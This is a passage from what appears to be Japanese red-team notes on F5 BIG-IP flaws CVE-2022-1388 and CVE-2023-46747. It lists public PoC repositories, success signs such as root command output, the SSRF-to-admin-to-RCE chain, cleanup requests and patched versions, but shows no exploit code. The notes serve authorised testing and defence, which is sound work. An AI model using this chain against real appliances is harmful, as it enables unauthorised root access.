# レスポンスの commandResult フィールドに id の出力が含まれれば RCE 確定
```

### PoC リポジトリ

- `horizon3ai/CVE-2022-1388-Exploit`
- `Al1ex/CVE-2022-1388`

### 成功シグナル

- レスポンス JSON の `commandResult` フィールドに `uid=0(root)` の文字列
- 装置側 `/var/log/restjavad.0.log` に「異常な hop-by-hop ヘッダー」の警告（侵害指標）

### 原状回復

```bash
# [Attacker] PoC で作成した永続化要素（cron / SSH 鍵 / admin ユーザー）は対象組織に削除を依頼
# 試行時刻と送信パケットを完全記録 → 侵害指標との切り分けに使う
```

### 確認されたバージョン

- 13.1.5+ / 14.1.4.6 / 15.1.5.1 / 16.1.2.2 / 17.0.0.1 以降はパッチ済み
- 11.6 / 12.1 系は EOL。機器交換推奨

---

## CVE-2023-46747 — F5 BIG-IP TMUI SSRF → admin 作成

**対象:** BIG-IP 13.1.x / 14.1.0 〜 14.1.5 / 15.1.0 〜 15.1.10 / 16.1.0 〜 16.1.4 / 17.0.0 〜 17.1.0
**手法クラス:** TMUI の SSRF + AJP プロトコル smuggling → 内部 `/mgmt/tm/auth/user/` への PUT → admin 権限ユーザー作成 → `/mgmt/tm/util/bash` RCE
**参照:** `../02_Initial_Access/Edge_Appliance_CVEs.md`

### PoC リポジトリ

- `W01fh4cker/CVE-2023-46747-RCE`
- `horizon3ai/CVE-2023-46747`

### 成功シグナル

- 攻撃後に新規 admin 権限ユーザーが作成され、その認証情報で `/mgmt/tm/util/bash` が叩ける
- 装置側 `/var/log/audit` に「user admin created by 127.0.0.1」（内部経由 PUT の証跡）

### 原状回復

```bash
# [Attacker] 作成された admin アカウントの削除を対象組織に依頼
# tmsh で確認・削除（対象組織実施）
# tmsh list auth user
# tmsh delete auth user [CREATED_USER]
```

### 確認されたバージョン

- 13.1.5.1 / 14.1.5.6 / 15.1.10.2 / 16.1.4.1 / 17.1.0.3 以降はパッチ済み

---

## 関連技術
- 前：`../02_Initial_Access/Edge_Appliance_CVEs.md`（エッジアプライアンス CVE の着火条件・フィンガープリント）
- 関連：`../02_Initial_Access/Web_Vulnerabilities/Command_Injection.md`（PDFKit コマンドインジェクション）
- 関連：`../02_Initial_Access/Web_Vulnerabilities/Path_Traversal.md`（Grafana CVE-2021-43798）
- 関連：`./Hashcat.md`（Grafana / CMS Made Simple ハッシュのクラック）
